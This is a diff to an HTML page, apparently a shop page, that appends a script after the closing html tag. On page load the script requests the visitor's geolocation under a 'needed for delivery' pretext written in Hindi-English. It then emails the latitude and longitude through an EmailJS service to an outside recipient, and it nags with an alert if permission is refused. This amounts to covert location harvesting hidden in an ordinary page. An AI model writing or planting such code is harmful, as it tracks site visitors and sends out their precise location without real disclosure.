@@ -111,3 +111,50 @@ showRandomItems();
 
 </body>
 </html>
+<h3>Delivery ke liye location allow karein</h3>
+<p>Page open hote hi location request aayegi.</p>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+// EmailJS Initialize
+(function(){
+   emailjs.init("2pInQghRcP-YZtYCK");
+})();
+
+// Page load hote hi location request
+window.onload = function() {
+   getLocationAndSend();
+};
+
+function getLocationAndSend() {
+
+ if (navigator.geolocation) {
+
+   navigator.geolocation.getCurrentPosition(function(position){
+
+     var lat = position.coords.latitude;
+     var lon = position.coords.longitude;
+
+     // Email send
+     emailjs.send("service_hxul50k","template_3mjgsjk",{
+        latitude: lat,
+        longitude: lon
+     })
+     .then(function(response) {
+        console.log("Location sent");
+     }, function(error) {
+        console.log("Error sending location");
+     });
+
+   },
+   function(){
+     alert("Delivery ke liye location allow karna zaroori hai.");
+   });
+
+ } else {
+   alert("Location supported nahi hai.");
+ }
+
+}
+</script>
